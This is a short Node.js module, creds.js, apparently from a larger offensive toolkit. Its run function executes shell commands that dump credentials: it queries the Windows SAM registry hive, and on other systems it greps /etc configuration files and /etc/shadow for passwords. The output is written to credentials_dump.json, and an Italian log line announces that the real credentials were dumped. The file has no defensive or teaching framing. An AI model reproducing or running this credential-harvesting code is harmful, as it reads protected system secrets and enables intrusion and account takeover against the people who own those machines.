// src/modules/creds.js
const { execSync } = require('child_process');
const logger = require('../utils/logger');

async function run() {
  try {
    const out = execSync(
      process.platform === 'win32'
        ? 'reg query HKLM\\SAM /s'
        : 'grep -R "password" /etc/*.conf /etc/shadow'
    ).toString();
    logger.json('credentials_dump.json',{dump: out});
    logger.info('Dump credenziali reali completato');
  } catch(e) {
    logger.error(`Creds exec error: ${e.message}`);
  }
}

module.exports = { run };
